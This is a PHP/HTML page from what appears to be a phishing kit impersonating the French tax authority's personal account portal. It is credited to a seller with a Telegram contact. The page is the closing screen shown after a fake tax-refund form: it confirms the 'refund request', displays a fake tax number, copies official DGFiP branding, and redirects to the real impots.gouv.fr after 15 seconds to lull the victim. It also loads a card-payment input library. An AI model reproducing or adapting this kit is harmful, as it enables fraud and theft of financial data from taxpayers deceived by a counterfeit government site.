<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <meta http-equiv="refresh" content="15;URL=https://www.impots.gouv.fr/accueil">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Login</title>
    </head>

    <body style="background-color: #E5E5E5;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Mise à jour de vos documents et options
            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="details">
                    <h3>Votre demande de remboursement a bien été prise en compte !</h3>
                    <p>
                        Si vous avez bien rempli le formulaire, vous recevrez un mail de confirmation dans les 48 heures qui suivent.<br>
                        Dans le cas contraire, merci de nous en faire part.
                         <div align="center" >
  <img  src="asset/imgs/Eclipse-1s-124px.gif" alt="loading" >
  <br>
    <p><i><font color="red"> Deconnexion dans 10 secondes</font></i>
 </div>
                    </p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-3">
                        <div class="widget">
                            <h3>INFORMATIONS</h3>
                            <ul>
                                <li>Aide sur le site</li>
                                <li>Plan du site</li>
                                <li>Confidentialité / Informations personnelles</li>
                                <li>Sécurité informatique</li>
                                <li>Ouverture des données publiques de la DGFiP</li>
                                <li>À quoi servent mes impôts ?</li>
                                <li>Supports pédagogiques et citoyens</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="widget">
                            <h3>QUALITÉ DE SERVICE</h3>
                            <ul>
                                <li>Accessibilité</li>
                                <li>Les engagements de la DGFiP</li>
                                <li>Votre avis sur le site</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="widget">
                            <h3>RUBRIQUES DU SITE</h3>
                            <ul>
                                <li>Particulier</li>
                                <li>Professionnel</li>
                                <li>Partenaire</li>
                                <li>Collectivité</li>
                                <li>International</li>
                                <li>Documentation</li>
                                <li>Statistiques</li>
                                <li>Trouver un contact</li>
                                <li>Nous connaître</li>
                                <li>Nous rejoindre</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="widget">
                            <h3>AUTRES SITES</h3>
                            <ul>
                                <li>Economie.gouv.fr</li>
                                <li>Cessions immobilières de l'Etat</li>
                                <li>Retraites de l'État</li>
                                <li>Ventes domaniales</li>
                                <li>Amendes</li>
                                <li>Stationnement.gouv.fr</li>
                                <li>Tipi budget</li>
                                <li>Timbres</li>
                                <li>Cadastre</li>
                                <li>Collectivités locales</li>
                                <li>Redevance du code de la route</li>
                                <li>Taxe de séjour</li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="social">
                    <p>Nous suivre : <img src="assets/imgs/facebook.png"> <img src="assets/imgs/twitter.png"></p>
                </div>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- COPYRIGHT -->
        <div id="copyright">
            <div class="copyright-top">
                <div class="container">
                    <p>Service-public.fr <span>|</span> Legifrance.gouv.fr</p>
                </div>
            </div>
            <div class="copyright-bottom">
                <div class="container">
                    &copy; Direction générale des Finances publiques <span>-</span> Mentions légales
                </div>
            </div>
        </div>
        <!-- END COPYRIGHT -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

    </body>

</html>